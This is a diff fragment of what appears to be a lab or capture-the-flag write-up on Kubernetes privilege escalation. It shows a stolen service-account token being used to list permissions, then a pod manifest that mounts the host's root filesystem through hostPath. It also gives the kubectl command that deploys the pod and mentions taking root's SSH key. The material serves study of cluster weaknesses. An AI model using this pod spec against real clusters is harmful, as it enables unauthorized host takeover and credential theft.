@@ -33,3 +33,32 @@ After obtaining both, we can start check our access rights in Kubernetes cluster
 cry0l1t3@k8:~$ export token=`cat k8.token`
 cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
 ```
+
+The permission we are looking for is the create new pods, if we have such permission, we then can create a new pod that mount the entire root fs into the host system in the container's root directory, after that we could access the host systems and directories, we start by creating a yaml and like below:
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Then, we create a new pod:
+```
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<ip>:<por> apply -f privesc.yaml
+```
+
+After that, we use kubeletctl again to grab root's SSH key
